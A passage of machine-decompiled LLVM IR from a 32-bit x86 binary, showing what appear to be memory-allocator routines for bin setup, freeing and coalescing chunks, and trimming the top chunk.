dec_label_pc_80518ab:                             ; preds = %dec_label_pc_80518a1, %dec_label_pc_80518a6
  %v1_80518ad = phi i32 [ %v3_8051894, %dec_label_pc_80518a1 ], [ %v1_80518ad.pre, %dec_label_pc_80518a6 ]
  %v0_80518ad = phi i32 [ %v3_8051897, %dec_label_pc_80518a1 ], [ %v0_80518a6, %dec_label_pc_80518a6 ]
  %v0_80518ab = load i32, i32* @edi, align 4
  %v1_80518ab = load i32, i32* %ebp.global-to-local, align 4
  %v2_80518ab = add i32 %v1_80518ab, %v0_80518ab
  store i32 %v2_80518ab, i32* @edi, align 4
  %v2_80518ad = add i32 %v1_80518ad, 12
  %v3_80518ad = inttoptr i32 %v2_80518ad to i32*
  store i32 %v0_80518ad, i32* %v3_80518ad, align 4
  %v0_80518b0 = load i32, i32* @edx, align 4
  %v1_80518b0 = load i32, i32* %eax.global-to-local, align 4
  %v2_80518b0 = add i32 %v1_80518b0, 8
  %v3_80518b0 = inttoptr i32 %v2_80518b0 to i32*
  store i32 %v0_80518b0, i32* %v3_80518b0, align 4
  br label %dec_label_pc_80518b3

dec_label_pc_80518b3:                             ; preds = %dec_label_pc_8051886, %dec_label_pc_80518ab
  store i32 %v1_80517fe, i32* %eax.global-to-local, align 4
  %v3_80518b7 = load i32, i32* %v2_80518b7, align 4
  store i32 %v3_80518b7, i32* @edx, align 4
  %v0_80518ba = load i32, i32* @ecx, align 4
  store i32 %v0_80518ba, i32* %v2_80518b7, align 4
  %v0_80518bd = load i32, i32* @edi, align 4
  %v1_80518bf = or i32 %v0_80518bd, 1
  store i32 %v1_80518bf, i32* %eax.global-to-local, align 4
  %v0_80518c2 = load i32, i32* @ecx, align 4
  %v1_80518c2 = load i32, i32* @edx, align 4
  %v2_80518c2 = add i32 %v1_80518c2, 12
  %v3_80518c2 = inttoptr i32 %v2_80518c2 to i32*
  store i32 %v0_80518c2, i32* %v3_80518c2, align 4
  %v0_80518c5 = load i32, i32* %eax.global-to-local, align 4
  %v1_80518c5 = load i32, i32* @ecx, align 4
  %v2_80518c5 = add i32 %v1_80518c5, 4
  %v3_80518c5 = inttoptr i32 %v2_80518c5 to i32*
  store i32 %v0_80518c5, i32* %v3_80518c5, align 4
  store i32 %v1_80517fe, i32* %eax.global-to-local, align 4
  %v0_80518cc = load i32, i32* @edx, align 4
  %v1_80518cc = load i32, i32* @ecx, align 4
  %v2_80518cc = add i32 %v1_80518cc, 8
  %v3_80518cc = inttoptr i32 %v2_80518cc to i32*
  store i32 %v0_80518cc, i32* %v3_80518cc, align 4
  %v0_80518cf = load i32, i32* %eax.global-to-local, align 4
  %v1_80518cf = load i32, i32* @ecx, align 4
  %v2_80518cf = add i32 %v1_80518cf, 12
  %v3_80518cf = inttoptr i32 %v2_80518cf to i32*
  store i32 %v0_80518cf, i32* %v3_80518cf, align 4
  %v0_80518d2 = load i32, i32* @edi, align 4
  %v1_80518d2 = load i32, i32* @ecx, align 4
  %v3_80518d2 = add i32 %v1_80518d2, %v0_80518d2
  %v4_80518d2 = inttoptr i32 %v3_80518d2 to i32*
  store i32 %v0_80518d2, i32* %v4_80518d2, align 4
  br label %dec_label_pc_80518e7

dec_label_pc_80518d7:                             ; preds = %dec_label_pc_8051876
  %v0_80518d7 = load i32, i32* @edi, align 4
  %v2_80518d7 = add i32 %v0_80518d7, %v1_805187e
  %v1_80518da = or i32 %v2_80518d7, 1
  store i32 %v1_80518da, i32* %eax.global-to-local, align 4
  %v1_80518dd = load i32, i32* @ecx, align 4
  %v2_80518dd = add i32 %v1_80518dd, 4
  %v3_80518dd = inttoptr i32 %v2_80518dd to i32*
  store i32 %v1_80518da, i32* %v3_80518dd, align 4
  store i32 %tmp20, i32* @edx, align 4
  %v0_80518e4 = load i32, i32* @ecx, align 4
  store i32 %v0_80518e4, i32* %v3_80518e4, align 4
  br label %dec_label_pc_80518e7

dec_label_pc_80518e7:                             ; preds = %dec_label_pc_80518b3, %dec_label_pc_80518d7
  store i32 %v3_8051839, i32* @ecx, align 4
  %v1_80518eb = icmp eq i32 %v3_8051839, 0
  %v1_80518ed = icmp eq i1 %v1_80518eb, false
  br i1 %v1_80518ed, label %dec_label_pc_8051839, label %dec_label_pc_80518f3

dec_label_pc_80518f3:                             ; preds = %dec_label_pc_80518e7, %dec_label_pc_8051825
  %v15_80518f7 = icmp eq i32 %v0_8051833, %v4_805181d
  %v4_80518fd = add i32 %v0_8051833, 4
  br i1 %v15_80518f7, label %dec_label_pc_805197b, label %dec_label_pc_8051825

dec_label_pc_8051907:                             ; preds = %dec_label_pc_8051907.lr.ph, %dec_label_pc_8051907
  %v1_805190b = phi i32 [ 1, %dec_label_pc_8051907.lr.ph ], [ %v0_8051916, %dec_label_pc_8051907 ]
  %v2_805190b = mul i32 %v1_805190b, 8
  %v4_805190b = add i32 %v3_805190b, %v2_805190b
  store i32 %v4_805190b, i32* %eax.global-to-local, align 4
  %v1_805190f = add i32 %v1_805190b, 1
  store i32 %v1_805190f, i32* %edx.global-to-local, align 4
  %v2_8051910 = add i32 %v4_805190b, 12
  %v3_8051910 = inttoptr i32 %v2_8051910 to i32*
  store i32 %v4_805190b, i32* %v3_8051910, align 4
  %v0_8051913 = load i32, i32* %eax.global-to-local, align 4
  %v2_8051913 = add i32 %v0_8051913, 8
  %v3_8051913 = inttoptr i32 %v2_8051913 to i32*
  store i32 %v0_8051913, i32* %v3_8051913, align 4
  %v0_8051916 = load i32, i32* %edx.global-to-local, align 4
  %v7_8051919 = icmp sgt i32 %v0_8051916, 95
  br i1 %v7_8051919, label %dec_label_pc_805191b, label %dec_label_pc_8051907

dec_label_pc_805191b:                             ; preds = %dec_label_pc_8051907
  store i32 %tmp20, i32* %eax.global-to-local, align 4
  %v1_805191f = add i32 %tmp20, 864
  %v2_805191f = inttoptr i32 %v1_805191f to i32*
  %v3_805191f = load i32, i32* %v2_805191f, align 4
  %v4_805191f = or i32 %v3_805191f, 1
  store i32 %v4_805191f, i32* %v2_805191f, align 4
  %v0_8051926 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051926 = add i32 %v0_8051926, 840
  %v2_8051926 = inttoptr i32 %v1_8051926 to i32*
  store i32 0, i32* %v2_8051926, align 4
  %v0_8051930 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051930 = add i32 %v0_8051930, 852
  %v2_8051930 = inttoptr i32 %v1_8051930 to i32*
  store i32 65536, i32* %v2_8051930, align 4
  %v0_805193a = load i32, i32* %eax.global-to-local, align 4
  %v1_805193a = add i32 %v0_805193a, 844
  %v2_805193a = inttoptr i32 %v1_805193a to i32*
  store i32 262144, i32* %v2_805193a, align 4
  %v0_8051944 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051944 = add i32 %v0_8051944, 836
  %v2_8051944 = inttoptr i32 %v1_8051944 to i32*
  store i32 262144, i32* %v2_8051944, align 4
  store i32 %tmp20, i32* @edx, align 4
  %v2_8051955 = load i32, i32* %arg1, align 4
  %v1_8051957 = urem i32 %v2_8051955, 4
  %v1_805195a = or i32 %v1_8051957, 72
  store i32 %v1_805195a, i32* %arg1, align 4
  %v0_805195f = load i32, i32* @edx, align 4
  %v1_8051961 = add i32 %v0_805195f, 52
  store i32 %v1_8051961, i32* %eax.global-to-local, align 4
  %v2_8051964 = add i32 %v0_805195f, 44
  %v3_8051964 = inttoptr i32 %v2_8051964 to i32*
  store i32 %v1_8051961, i32* %v3_8051964, align 4
  %v1_8051969 = call i32 @function_8051f63(i32 30)
  store i32 %v1_8051969, i32* %eax.global-to-local, align 4
  %v2_8051975 = add i32 %tmp20, 860
  %v3_8051975 = inttoptr i32 %v2_8051975 to i32*
  store i32 %v1_8051969, i32* %v3_8051975, align 4
  br label %dec_label_pc_805197b

dec_label_pc_805197b:                             ; preds = %dec_label_pc_80518f3, %dec_label_pc_805191b
  store i32 %v0_80517de, i32* @ebx, align 4
  store i32 %v0_80517dd, i32* @esi, align 4
  store i32 %v0_80517dc, i32* @edi, align 4
  %v0_8051982 = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_8051982

; uselistorder directives
  uselistorder i32 %v0_8051916, { 1, 0 }
  uselistorder i32 %v0_8051913, { 1, 0 }
  uselistorder i32 %v1_805190b, { 1, 0 }
  uselistorder i32 %v0_80518d2, { 1, 0 }
  uselistorder i32 %v1_805188d, { 1, 0 }
  uselistorder i32 %v2_8051886, { 1, 0 }
  uselistorder i32 %v1_805187e, { 0, 2, 1, 3 }
  uselistorder i32 %v1_805188a, { 1, 0 }
  uselistorder i32 %v3_8051839, { 2, 1, 3, 0 }
  uselistorder i32 %v0_8051856, { 2, 1, 0, 4, 3 }
  uselistorder i32 %v0_8051833, { 1, 0, 3, 2 }
  uselistorder i32* %v3_80518e4, { 1, 0 }
  uselistorder i32 %v1_80517fe, { 1, 0 }
  uselistorder i32 %tmp20, { 3, 13, 11, 10, 8, 7, 1, 9, 2, 6, 5, 0, 12, 4 }
  uselistorder i32* %ebp.global-to-local, { 1, 0, 2 }
  uselistorder i32* %eax.global-to-local, { 24, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 17, 18, 15, 16, 19, 20, 21, 22, 23, 25, 26, 27, 28 }
  uselistorder i32 860, { 1, 0 }
  uselistorder i32 -3, { 1, 0 }
  uselistorder label %dec_label_pc_805197b, { 1, 0 }
  uselistorder label %dec_label_pc_8051907, { 1, 0 }
  uselistorder label %dec_label_pc_80518e7, { 1, 0 }
  uselistorder label %dec_label_pc_80518b3, { 1, 0 }
  uselistorder label %dec_label_pc_80518ab, { 1, 0 }
  uselistorder label %dec_label_pc_8051876, { 1, 0 }
}

define i32 @function_8051983(i32 %arg1) local_unnamed_addr {
dec_label_pc_8051983:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_8051983 = load i32, i32* @ebp, align 4
  %v0_8051984 = load i32, i32* @edi, align 4
  %v0_8051985 = load i32, i32* @esi, align 4
  %v0_8051986 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_805198e = icmp eq i32 %arg1, 0
  br i1 %v1_805198e, label %dec_label_pc_8051b17, label %dec_label_pc_8051996

dec_label_pc_8051996:                             ; preds = %dec_label_pc_8051983
  %v2_80519a1 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_80519a1, i32* @eax, align 4
  %v2_80519a6 = call i32 @function_80520ea(i32 %v2_80519a1, i32 134553831)
  store i32 %v2_80519a6, i32* %eax.global-to-local, align 4
  %v1_80519b2 = call i32 @function_80520e7(i32 ptrtoint (i32* @global_var_8054300.32 to i32))
  %v1_80519b7 = add i32 %arg1, -8
  store i32 %v1_80519b7, i32* @ecx, align 4
  %v0_80519ba = load i8, i8* @global_var_80545e0.33, align 1
  %v1_80519ba = sext i8 %v0_80519ba to i32
  store i32 %v1_80519ba, i32* %eax.global-to-local, align 4
  %v1_80519c2 = add i32 %arg1, -4
  %v2_80519c2 = inttoptr i32 %v1_80519c2 to i32*
  %v3_80519c2 = load i32, i32* %v2_80519c2, align 4
  %v1_80519c7 = and i32 %v3_80519c2, -4
  %v4_80519c7 = trunc i32 %v1_80519c7 to i8
  store i32 %v1_80519c7, i32* @ebx, align 4
  %v8_80519cc = icmp ugt i8 %v4_80519c7, %v0_80519ba
  br i1 %v8_80519cc, label %dec_label_pc_80519ee, label %dec_label_pc_80519ce

dec_label_pc_80519ce:                             ; preds = %dec_label_pc_8051996
  %v2_80519ce = udiv i32 %v3_80519c2, 8
  %v1_80519d1 = or i32 %v1_80519ba, 3
  %v3_80519d1 = trunc i32 %v1_80519d1 to i8
  store i32 %v1_80519d1, i32* %eax.global-to-local, align 4
  store i8 %v3_80519d1, i8* @global_var_80545e0.33, align 32
  %v1_80519d9 = mul nuw i32 %v2_80519ce, 4
  %v2_80519d9 = add i32 %v1_80519d9, ptrtoint (i8* @global_var_80545e0.33 to i32)
  store i32 %v2_80519d9, i32* @edx, align 4
  %v1_80519e0 = add i32 %v1_80519d9, add (i32 ptrtoint (i8* @global_var_80545e0.33 to i32), i32 -4)
  %v2_80519e0 = inttoptr i32 %v1_80519e0 to i32*
  %v3_80519e0 = load i32, i32* %v2_80519e0, align 4
  store i32 %v3_80519e0, i32* %eax.global-to-local, align 4
  %v3_80519e3 = inttoptr i32 %arg1 to i32*
  store i32 %v3_80519e0, i32* %v3_80519e3, align 4
  %v0_80519e6 = load i32, i32* @ecx, align 4
  %v1_80519e6 = load i32, i32* @edx, align 4
  %v2_80519e6 = add i32 %v1_80519e6, -4
  %v3_80519e6 = inttoptr i32 %v2_80519e6 to i32*
  store i32 %v0_80519e6, i32* %v3_80519e6, align 4
  br label %dec_label_pc_8051b06

dec_label_pc_80519ee:                             ; preds = %dec_label_pc_8051996
  %v1_80519ee = trunc i32 %v3_80519c2 to i8
  %v2_80519ee = and i8 %v1_80519ee, 2
  %v3_80519ee = icmp eq i8 %v2_80519ee, 0
  %v5_80519ee = zext i8 %v2_80519ee to i32
  %v7_80519ee = and i32 %v3_80519c2, -256
  %v8_80519ee = or i32 %v5_80519ee, %v7_80519ee
  store i32 %v8_80519ee, i32* @edx, align 4
  %v1_80519f1 = icmp eq i1 %v3_80519ee, false
  br i1 %v1_80519f1, label %dec_label_pc_8051ae6, label %dec_label_pc_80519f7

dec_label_pc_80519f7:                             ; preds = %dec_label_pc_80519ee
  %v1_80519f7 = or i32 %v1_80519ba, 1
  %v3_80519f7 = trunc i32 %v1_80519f7 to i8
  store i32 %v1_80519f7, i32* %eax.global-to-local, align 4
  %v2_80519fa = add i32 %v1_80519c7, %v1_80519b7
  store i32 %v2_80519fa, i32* @esi, align 4
  store i8 %v3_80519f7, i8* @global_var_80545e0.33, align 32
  %v1_8051a02 = add i32 %v2_80519fa, 4
  %v2_8051a02 = inttoptr i32 %v1_8051a02 to i32*
  %v3_8051a02 = load i32, i32* %v2_8051a02, align 4
  store i32 %v3_8051a02, i32* %eax.global-to-local, align 4
  %v2_8051a09 = inttoptr i32 %v1_80519c2 to i8*
  %v3_8051a09 = load i8, i8* %v2_8051a09, align 1
  %v4_8051a09 = urem i8 %v3_8051a09, 2
  %v5_8051a09 = icmp eq i8 %v4_8051a09, 0
  %v1_8051a0d = icmp eq i1 %v5_8051a09, false
  br i1 %v1_8051a0d, label %dec_label_pc_8051a30, label %dec_label_pc_8051a0f

dec_label_pc_8051a0f:                             ; preds = %dec_label_pc_80519f7
  %v2_8051a0f = inttoptr i32 %v1_80519b7 to i32*
  %v3_8051a0f = load i32, i32* %v2_8051a0f, align 4
  store i32 %v3_8051a0f, i32* @ebp, align 4
  %v2_8051a14 = sub i32 %v1_80519b7, %v3_8051a0f
  store i32 %v2_8051a14, i32* %eax.global-to-local, align 4
  %v1_8051a16 = add i32 %v2_8051a14, 8
  %v2_8051a16 = inttoptr i32 %v1_8051a16 to i32*
  %v3_8051a16 = load i32, i32* %v2_8051a16, align 4
  store i32 %v3_8051a16, i32* @edi, align 4
  %v1_8051a19 = add i32 %v2_8051a14, 12
  %v2_8051a19 = inttoptr i32 %v1_8051a19 to i32*
  %v3_8051a19 = load i32, i32* %v2_8051a19, align 4
  store i32 %v3_8051a19, i32* @edx, align 4
  %v1_8051a1c = add i32 %v3_8051a16, 12
  %v2_8051a1c = inttoptr i32 %v1_8051a1c to i32*
  %v3_8051a1c = load i32, i32* %v2_8051a1c, align 4
  store i32 %v3_8051a1c, i32* @ecx, align 4
  %v12_8051a1f = icmp eq i32 %v3_8051a1c, %v2_8051a14
  %v1_8051a21 = icmp eq i1 %v12_8051a1f, false
  br i1 %v1_8051a21, label %dec_label_pc_8051a5f, label %dec_label_pc_8051a23

dec_label_pc_8051a23:                             ; preds = %dec_label_pc_8051a0f
  %v1_8051a23 = add i32 %v3_8051a19, 8
  %v2_8051a23 = inttoptr i32 %v1_8051a23 to i32*
  %v3_8051a23 = load i32, i32* %v2_8051a23, align 4
  %v15_8051a23 = icmp eq i32 %v3_8051a23, %v3_8051a1c
  %v1_8051a26 = icmp eq i1 %v15_8051a23, false
  br i1 %v1_8051a26, label %dec_label_pc_8051a5f, label %dec_label_pc_8051a28

dec_label_pc_8051a28:                             ; preds = %dec_label_pc_8051a23
  %v2_8051a28 = add i32 %v3_8051a0f, %v1_80519c7
  store i32 %v2_8051a28, i32* @ebx, align 4
  store i32 %v3_8051a19, i32* %v2_8051a1c, align 4
  %v0_8051a2d = load i32, i32* @edi, align 4
  %v1_8051a2d = load i32, i32* @edx, align 4
  %v2_8051a2d = add i32 %v1_8051a2d, 8
  %v3_8051a2d = inttoptr i32 %v2_8051a2d to i32*
  store i32 %v0_8051a2d, i32* %v3_8051a2d, align 4
  %v0_8051a37.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8051a30

dec_label_pc_8051a30:                             ; preds = %dec_label_pc_80519f7, %dec_label_pc_8051a28
  %v1_8051a43 = phi i32 [ %v2_80519fa, %dec_label_pc_80519f7 ], [ %v0_8051a37.pre, %dec_label_pc_8051a28 ]
  %v1_8051a34 = and i32 %v3_8051a02, -4
  store i32 %v1_8051a34, i32* @ebp, align 4
  %v1_8051a37 = load i32, i32* @global_var_805460c.34, align 4
  %v12_8051a37 = icmp eq i32 %v1_8051a43, %v1_8051a37
  br i1 %v12_8051a37, label %dec_label_pc_8051a91, label %dec_label_pc_8051a3f

dec_label_pc_8051a3f:                             ; preds = %dec_label_pc_8051a30
  %v2_8051a3f = add i32 %v1_8051a43, 4
  %v3_8051a3f = add i32 %v2_8051a3f, %v1_8051a34
  %v4_8051a3f = inttoptr i32 %v3_8051a3f to i32*
  %v5_8051a3f = load i32, i32* %v4_8051a3f, align 4
  store i32 %v5_8051a3f, i32* %eax.global-to-local, align 4
  %v3_8051a43 = inttoptr i32 %v2_8051a3f to i32*
  store i32 %v1_8051a34, i32* %v3_8051a43, align 4
  %v0_8051a46 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051a46 = urem i32 %v0_8051a46, 2
  %v2_8051a46 = icmp eq i32 %v1_8051a46, 0
  store i32 %v1_8051a46, i32* %eax.global-to-local, align 4
  %v1_8051a4b = icmp eq i1 %v2_8051a46, false
  br i1 %v1_8051a4b, label %dec_label_pc_8051a6c, label %dec_label_pc_8051a4d

dec_label_pc_8051a4d:                             ; preds = %dec_label_pc_8051a3f
  %v0_8051a4d = load i32, i32* @esi, align 4
  %v1_8051a4d = add i32 %v0_8051a4d, 8
  %v2_8051a4d = inttoptr i32 %v1_8051a4d to i32*
  %v3_8051a4d = load i32, i32* %v2_8051a4d, align 4
  store i32 %v3_8051a4d, i32* @edx, align 4
  %v1_8051a50 = add i32 %v0_8051a4d, 12
  %v2_8051a50 = inttoptr i32 %v1_8051a50 to i32*
  %v3_8051a50 = load i32, i32* %v2_8051a50, align 4
  store i32 %v3_8051a50, i32* %eax.global-to-local, align 4
  %v1_8051a53 = add i32 %v3_8051a4d, 12
  %v2_8051a53 = inttoptr i32 %v1_8051a53 to i32*
  %v3_8051a53 = load i32, i32* %v2_8051a53, align 4
  store i32 %v3_8051a53, i32* @edi, align 4
  %v12_8051a56 = icmp eq i32 %v3_8051a53, %v0_8051a4d
  %v1_8051a58 = icmp eq i1 %v12_8051a56, false
  br i1 %v1_8051a58, label %dec_label_pc_8051a5f, label %dec_label_pc_8051a5a

dec_label_pc_8051a5a:                             ; preds = %dec_label_pc_8051a4d
  %v1_8051a5a = add i32 %v3_8051a50, 8
  %v2_8051a5a = inttoptr i32 %v1_8051a5a to i32*
  %v3_8051a5a = load i32, i32* %v2_8051a5a, align 4
  %v15_8051a5a = icmp eq i32 %v3_8051a5a, %v3_8051a53
  br i1 %v15_8051a5a, label %dec_label_pc_8051a64, label %dec_label_pc_8051a5f

dec_label_pc_8051a5f:                             ; preds = %dec_label_pc_8051a5a, %dec_label_pc_8051a4d, %dec_label_pc_8051a23, %dec_label_pc_8051a0f
  %v0_8051a5f = call i32 @function_8051b1f()
  store i32 %v0_8051a5f, i32* %eax.global-to-local, align 4
  %v1_8051a64.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8051a64

dec_label_pc_8051a64:                             ; preds = %dec_label_pc_8051a5a, %dec_label_pc_8051a5f
  %v1_8051a64 = phi i32 [ %v3_8051a4d, %dec_label_pc_8051a5a ], [ %v1_8051a64.pre, %dec_label_pc_8051a5f ]
  %v0_8051a64 = phi i32 [ %v3_8051a50, %dec_label_pc_8051a5a ], [ %v0_8051a5f, %dec_label_pc_8051a5f ]
  %v2_8051a64 = add i32 %v1_8051a64, 12
  %v3_8051a64 = inttoptr i32 %v2_8051a64 to i32*
  store i32 %v0_8051a64, i32* %v3_8051a64, align 4
  %v0_8051a67 = load i32, i32* @edx, align 4
  %v1_8051a67 = load i32, i32* %eax.global-to-local, align 4
  %v2_8051a67 = add i32 %v1_8051a67, 8
  %v3_8051a67 = inttoptr i32 %v2_8051a67 to i32*
  store i32 %v0_8051a67, i32* %v3_8051a67, align 4
  %v0_8051a6a = load i32, i32* @ebx, align 4
  %v1_8051a6a = load i32, i32* @ebp, align 4
  %v2_8051a6a = add i32 %v1_8051a6a, %v0_8051a6a
  store i32 %v2_8051a6a, i32* @ebx, align 4
  br label %dec_label_pc_8051a6c

dec_label_pc_8051a6c:                             ; preds = %dec_label_pc_8051a3f, %dec_label_pc_8051a64
  %v0_8051a6c = load i32, i32* @global_var_805461c.52, align 4
  store i32 %v0_8051a6c, i32* %eax.global-to-local, align 4
  %v0_8051a71 = load i32, i32* @ecx, align 4
  %v1_8051a71 = add i32 %v0_8051a71, 12
  %v2_8051a71 = inttoptr i32 %v1_8051a71 to i32*
  store i32 ptrtoint (i32* @global_var_8054614.36 to i32), i32* %v2_8051a71, align 4
  %v0_8051a78 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051a78 = load i32, i32* @ecx, align 4
  %v2_8051a78 = add i32 %v1_8051a78, 8
  %v3_8051a78 = inttoptr i32 %v2_8051a78 to i32*
  store i32 %v0_8051a78, i32* %v3_8051a78, align 4
  %v0_8051a7b = load i32, i32* @ebx, align 4
  %v1_8051a7b = load i32, i32* @ecx, align 4
  %v3_8051a7b = add i32 %v1_8051a7b, %v0_8051a7b
  %v4_8051a7b = inttoptr i32 %v3_8051a7b to i32*
  store i32 %v0_8051a7b, i32* %v4_8051a7b, align 4
  %v0_8051a7e = load i32, i32* @ecx, align 4
  %v1_8051a7e = load i32, i32* %eax.global-to-local, align 4
  %v2_8051a7e = add i32 %v1_8051a7e, 12
  %v3_8051a7e = inttoptr i32 %v2_8051a7e to i32*
  store i32 %v0_8051a7e, i32* %v3_8051a7e, align 4
  %v0_8051a81 = load i32, i32* @ebx, align 4
  %v1_8051a83 = or i32 %v0_8051a81, 1
  store i32 %v1_8051a83, i32* %eax.global-to-local, align 4
  %v0_8051a86 = load i32, i32* @ecx, align 4
  store i32 %v0_8051a86, i32* @global_var_805461c.52, align 4
  %v2_8051a8c = add i32 %v0_8051a86, 4
  %v3_8051a8c = inttoptr i32 %v2_8051a8c to i32*
  store i32 %v1_8051a83, i32* %v3_8051a8c, align 4
  br label %dec_label_pc_8051aa1

dec_label_pc_8051a91:                             ; preds = %dec_label_pc_8051a30
  %v0_8051a91 = load i32, i32* @ebx, align 4
  %v2_8051a91 = add i32 %v0_8051a91, %v1_8051a34
  store i32 %v2_8051a91, i32* @ebx, align 4
  %v1_8051a95 = or i32 %v2_8051a91, 1
  store i32 %v1_8051a95, i32* %eax.global-to-local, align 4
  %v1_8051a98 = load i32, i32* @ecx, align 4
  %v2_8051a98 = add i32 %v1_8051a98, 4
  %v3_8051a98 = inttoptr i32 %v2_8051a98 to i32*
  store i32 %v1_8051a95, i32* %v3_8051a98, align 4
  %v0_8051a9b = load i32, i32* @ecx, align 4
  store i32 %v0_8051a9b, i32* @global_var_805460c.34, align 4
  br label %dec_label_pc_8051aa1

dec_label_pc_8051aa1:                             ; preds = %dec_label_pc_8051a6c, %dec_label_pc_8051a91
  %v0_8051aa1 = load i32, i32* @ebx, align 4
  %tmp21 = icmp ult i32 %v0_8051aa1, 131072
  br i1 %tmp21, label %dec_label_pc_8051b06, label %dec_label_pc_8051aa9

dec_label_pc_8051aa9:                             ; preds = %dec_label_pc_8051aa1
  %v0_8051aa9 = load i8, i8* @global_var_80545e0.33, align 32
  %v1_8051aa9 = and i8 %v0_8051aa9, 2
  %v2_8051aa9 = icmp eq i8 %v1_8051aa9, 0
  br i1 %v2_8051aa9, label %dec_label_pc_8051ac2, label %dec_label_pc_8051ab2

dec_label_pc_8051ab2:                             ; preds = %dec_label_pc_8051aa9
  %v2_8051aba = call i32 @function_80517db(i32* bitcast (i8* @global_var_80545e0.33 to i32*))
  store i32 %v2_8051aba, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051ac2

dec_label_pc_8051ac2:                             ; preds = %dec_label_pc_8051aa9, %dec_label_pc_8051ab2
  %v0_8051ac2 = load i32, i32* @global_var_805460c.34, align 4
  store i32 %v0_8051ac2, i32* %eax.global-to-local, align 4
  %v1_8051ac7 = add i32 %v0_8051ac2, 4
  %v2_8051ac7 = inttoptr i32 %v1_8051ac7 to i32*
  %v3_8051ac7 = load i32, i32* %v2_8051ac7, align 4
  %v1_8051aca = and i32 %v3_8051ac7, -4
  store i32 %v1_8051aca, i32* %eax.global-to-local, align 4
  %v1_8051acd = load i32, i32* @global_var_8054924.50, align 4
  %v7_8051acd = icmp ult i32 %v1_8051aca, %v1_8051acd
  br i1 %v7_8051acd, label %dec_label_pc_8051b06, label %dec_label_pc_8051ad5

dec_label_pc_8051ad5:                             ; preds = %dec_label_pc_8051ac2
  store i32 ptrtoint (i8* @global_var_80545e0.33 to i32), i32* @edx, align 4
  %v0_8051ada = load i32, i32* @global_var_8054928.48, align 8
  store i32 %v0_8051ada, i32* @eax, align 4
  %v0_8051adf = call i32 @function_805174e()
  store i32 %v0_8051adf, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051b06

dec_label_pc_8051ae6:                             ; preds = %dec_label_pc_80519ee
  %v2_8051ae6 = inttoptr i32 %v1_80519b7 to i32*
  %v3_8051ae6 = load i32, i32* %v2_8051ae6, align 4
  %v0_8051ae9 = load i32, i32* @global_var_8054930.41, align 16
  %v1_8051ae9 = add i32 %v0_8051ae9, -1
  store i32 %v1_8051ae9, i32* @global_var_8054930.41, align 16
  %v2_8051aef = add i32 %v3_8051ae6, %v1_80519c7
  store i32 %v2_8051aef, i32* %eax.global-to-local, align 4
  %v2_8051af2 = sub i32 %v1_80519b7, %v3_8051ae6
  %v0_8051af8 = load i32, i32* @global_var_8054944.44, align 4
  %v2_8051af8 = sub i32 %v0_8051af8, %v2_8051aef
  store i32 %v2_8051af8, i32* @global_var_8054944.44, align 4
  %v4_8051afe = inttoptr i32 %v2_8051af2 to i32*
  %v5_8051afe = call i32 @function_805284d(i32* %v4_8051afe, i32 %v2_8051aef, i32 %v1_80519c7, i32 %v1_80519c7)
  store i32 %v5_8051afe, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051b06

dec_label_pc_8051b06:                             ; preds = %dec_label_pc_8051ac2, %dec_label_pc_8051aa1, %dec_label_pc_8051ad5, %dec_label_pc_80519ce, %dec_label_pc_8051ae6
  store i32 %v2_80519a1, i32* @eax, align 4
  %v2_8051b0f = call i32 @function_80520ea(i32 %v2_80519a1, i32 1)
  store i32 %v2_8051b0f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051b17

dec_label_pc_8051b17:                             ; preds = %dec_label_pc_8051983, %dec_label_pc_8051b06
  %.0 = phi i32 [ undef, %dec_label_pc_8051983 ], [ %v2_8051b0f, %dec_label_pc_8051b06 ]
  store i32 %v0_8051986, i32* @ebx, align 4
  store i32 %v0_8051985, i32* @esi, align 4
  store i32 %v0_8051984, i32* @edi, align 4
  store i32 %v0_8051983, i32* @ebp, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder i32 %v3_8051ae6, { 1, 0 }
  uselistorder i32 %v0_8051a7b, { 1, 0 }
  uselistorder i32 %v1_8051a46, { 1, 0 }
  uselistorder i32 %v2_8051a3f, { 1, 0 }
  uselistorder i32 %v1_8051a34, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8051a43, { 1, 0 }
  uselistorder i32 %v1_80519c7, { 3, 4, 0, 1, 2, 5, 6 }
  uselistorder i32 %v3_80519c2, { 1, 2, 0, 3 }
  uselistorder i32 %v1_80519b7, { 1, 4, 2, 3, 0, 5 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 5, 3, 4, 6, 7, 8, 9, 10, 11, 14, 15, 12, 13, 16, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i32* bitcast (i8* @global_var_80545e0.33 to i32*), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_8054614.36 to i32), { 1, 2, 3, 4, 5, 6, 7, 0, 8 }
  uselistorder i32* @global_var_805460c.34, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11 }
  uselistorder i32 ptrtoint (i8* @global_var_80545e0.33 to i32), { 7, 6, 0, 5, 4, 1, 3, 2 }
  uselistorder i8* @global_var_80545e0.33, { 4, 7, 6, 5, 3, 0, 2, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_8054300.32 to i32), { 0, 1, 4, 2, 3, 5 }
  uselistorder i32 %arg1, { 1, 0, 4, 3, 2 }
  uselistorder label %dec_label_pc_8051b17, { 1, 0 }
  uselistorder label %dec_label_pc_8051b06, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_8051ac2, { 1, 0 }
  uselistorder label %dec_label_pc_8051aa1, { 1, 0 }
  uselistorder label %dec_label_pc_8051a6c, { 1, 0 }
